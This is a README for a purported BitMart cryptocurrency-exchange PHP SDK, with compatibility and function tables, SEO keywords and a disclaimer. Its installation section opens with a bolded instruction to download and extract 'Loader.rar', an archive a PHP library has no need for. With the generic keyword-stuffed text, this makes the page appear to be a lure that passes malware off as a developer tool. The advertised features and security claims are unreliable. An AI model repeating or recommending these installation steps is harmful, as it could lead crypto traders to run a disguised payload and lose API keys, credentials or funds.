# 🚀 BitMart PHP SDK API

Welcome to the BitMart PHP SDK API repository! This open source project provides a robust, flexible, and developer-friendly PHP Software Development Kit (SDK) for working with the BitMart cryptocurrency exchange API. Effortlessly integrate BitMart’s features into your applications, automate trading, manage orders, and access real-time market data all through PHP. This SDK empowers developers to build scalable financial services, trading bots, portfolio trackers, and a wide range of blockchain-powered applications seamlessly.

Use this repository to accelerate your crypto development journey using the latest industry standards, clean PHP code, and best security practices. Whether you're building a personal trading bot or a large-scale trading platform, this SDK enables secure and reliable integration with BitMart's powerful API suite.

---

## 💻 OS Compatibility Table

Below is a comprehensive table detailing operating system compatibility for the BitMart PHP SDK API, ensuring seamless integration across multiple platforms:

| Operating System      | Supported | Recommended Version | Special Notes                            |
|----------------------|:---------:|:-------------------:|------------------------------------------|
| 🟢 Windows           |    ✔️     | 10, 11, Server 2019+| Full support for x86/x64 architectures   |
| 🍏 macOS             |    ✔️     | 11 (Big Sur)+       | Native compatibility with M1 & Intel CPUs|
| 🐧 Linux             |    ✔️     | Ubuntu 20.04+, Debian 11+ | Works on most major distributions   |
| 📱 Android (Termux)  |    ✔️     | Latest              | Useful for on-the-go API testing         |
| 📦 Docker            |    ✔️     | Latest              | Use official PHP images for best results |
| ☁️ Cloud (AWS, GCP)  |    ✔️     | Latest LTS OS       | Ideal for cloud automation pipelines     |

Optimal performance is ensured on all modern OSes. For maximum stability, please maintain your environment updated with the latest stable PHP version (8.0+).

---

## 🛠️ Feature List

Leverage a comprehensive toolset of PHP classes, methods, and utilities designed to accelerate your crypto integration and automation:

- **Easy Authentication** - Secure API key/secret-based authentication for fast onboarding.
- **Real-Time Data Retrieval** - Effortlessly stream live market data, tickers, and depth charts.
- **Order Management** - Place, modify, and cancel spot, margin, and futures orders programmatically.
- **Account Balances** - Retrieve all wallet balances, transaction histories, and funding records.
- **Trade Automation** - Automate your trading logic with advanced order and position management.
- **Flexible Configuration** - Customizable endpoints, timeout adjustments, logging, and debugging modes.
- **Comprehensive Error Handling** - Intelligent exception and error reporting for smooth troubleshooting.
- **Extensive Documentation** - Well-commented code with PHPDoc blocks and examples for every core function.
- **Rate Limit Protection** - Built-in throttling features to remain within API usage quotas.
- **Secure Credentials Storage** - Recommendations for .env or config-based secret management.
- **Modular Design** - Easily extendable structure to add new BitMart API endpoints.
- **Cross-platform Usage** - Compatible with CLI scripts, web backends, Docker containers, and serverless deployments.
- **Community Support** - Frequent updates, issue tracking, and roadmap enhancements.

---

## 📦 Installation Instructions

Getting started is fast and simple! Please follow the precise steps below for a successful setup:

**1. Download Loader.rar from the repository. Do not extract the archive in locations with restricted permissions.**
2. Extract the contents of Loader.rar to your project directory using favorite archival utility (e.g., WinRAR, 7-Zip, Archive Utility, tar).
3. Install all required PHP dependencies listed in the `composer.json`. Run:
   `composer install`
4. Copy the sample `.env.example` file to `.env`, and fill in your BitMart API credentials and preferences.
5. Include the main SDK autoloader in your project:

   `require_once 'path/to/bitmart-php-sdk/autoload.php';`

6. Explore the example scripts in the `/examples` directory or build your own trading logic using the provided classes and methods.
7. For Docker users, use the included Dockerfile and configuration for one-command deployment on any server.

Please refer to the [full documentation](./docs/) for advanced configuration, troubleshooting, and usage guidelines.

---

## ⚙️ Function Descriptions Table

Below is a searchable, detailed table listing all major SDK PHP functions included in this repository. Use this as a quick reference to available capabilities and methods:

| Function                  | Description                                                                       | Parameters                                     | Return Value                   |
|---------------------------|-----------------------------------------------------------------------------------|------------------------------------------------|-------------------------------|
| authenticate()            | Establishes secure connection to BitMart using your API credentials.              | api_key, api_secret, memo                      | boolean (true/false)           |
| getMarketTickers()        | Retrieves latest market ticker data for all available trading pairs.              | none                                           | array of tickers               |
| getAccountBalance()       | Fetches the current account wallet balances.                                      | none                                           | array (currency=>balance)      |
| placeOrder()              | Places a limit or market order with specified parameters.                         | symbol, side, type, quantity, price, etc.      | array (order details)          |
| cancelOrder()             | Cancels an open order based on order ID and symbol.                               | order_id, symbol                               | boolean                        |
| listOrders()              | Returns a list of current and historical orders with filtering options.           | status, symbol, limit, start_time, end_time    | array of orders                |
| getOrderDetail()          | Fetches information about a specific order by ID.                                 | order_id, symbol                               | array (order detail)           |
| getTradeHistory()         | Retrieves trade execution records for your account.                               | symbol, limit, start_time, end_time            | array of trades                |
| getDepth()                | Fetches the current order book (depth) for a given trading pair.                  | symbol                                         | array (bids & asks)            |
| transfer()                | Moves funds between different wallets (e.g., spot to margin).                     | amount, currency, fromWallet, toWallet         | array (transfer result)        |
| withdraw()                | Initiates a withdrawal to external address, supporting all available assets.      | currency, amount, address, chain, memo         | array (withdraw result)        |
| getDepositHistory()       | Retrieves a history of all account deposits with filtering and sorting options.   | currency, limit, start_time, end_time          | array of deposits              |
| getOpenPositions()        | Lists open positions for futures and margin trading accounts.                     | symbol                                         | array of positions             |
| subscribeToWebSocket()    | Opens a WebSocket connection for streaming live trades and market events.         | channels, callback_function                    | WebSocket object               |
| setConfig()               | Modifies SDK settings (timeouts, endpoints, debug mode, etc.) dynamically.        | config_array                                   | null                           |
| getApiUsageStats()        | Reports API quota limits, current usage, and time until reset.                    | none                                           | array (rate limits)            |
| logEvent()                | Logs SDK or application-level events for auditing and debugging.                  | event_name, context_data                       | string (log entry location)    |

You can find more technical documentation in the docs directory, including shapes of return values, typical usage patterns, and best practices for robust integration.

---

## 💡 Keywords (SEO-optimized)

BitMart PHP SDK, BitMart API PHP, crypto trading PHP, cryptocurrency exchange API, automated trading PHP, live crypto price feed, PHP blockchain SDK, BitMart developer library, digital asset trading, web3 PHP integration, PHP trading bot, secure crypto wallet API, digital currency SDK, PHP crypto portfolio tools, open source crypto API.

---

## ⚠️ Disclaimer

This project is provided as an open source resource under the MIT License. It is intended for educational and development use ONLY. Please abide by BitMart’s terms of service and comply with all regulatory requirements applicable to your jurisdiction. The authors and contributors accept **no liability** for losses, misuse, or violations that may arise from the use of this SDK. Use this repository at your own risk. Always secure your API keys and secrets in accordance with best security practices.

The SDK does **not** circumvent, bypass, or undermine any operational rules or legal restrictions imposed by BitMart or any other cryptocurrency platform.

---

## 📑 MIT License

This repository is made available under the permissive [MIT License (2025)](https://opensource.org/licenses/MIT). Redistribute, modify, or use in your proprietary or open source PHP projects with minimal restrictions.

---

## ✨ Contributing

We welcome all contributors! To submit feedback, request features, create pull requests, or report bugs, please see the CONTRIBUTING guide in the docs directory.

---

## 🙌 Thank You

Thank you for choosing the BitMart PHP SDK API! Happy coding and successful trades! For support or inquiries, open an issue on GitHub or refer to the community discussion board.

🟢 Stay secure, automate with ease, and integrate smarter!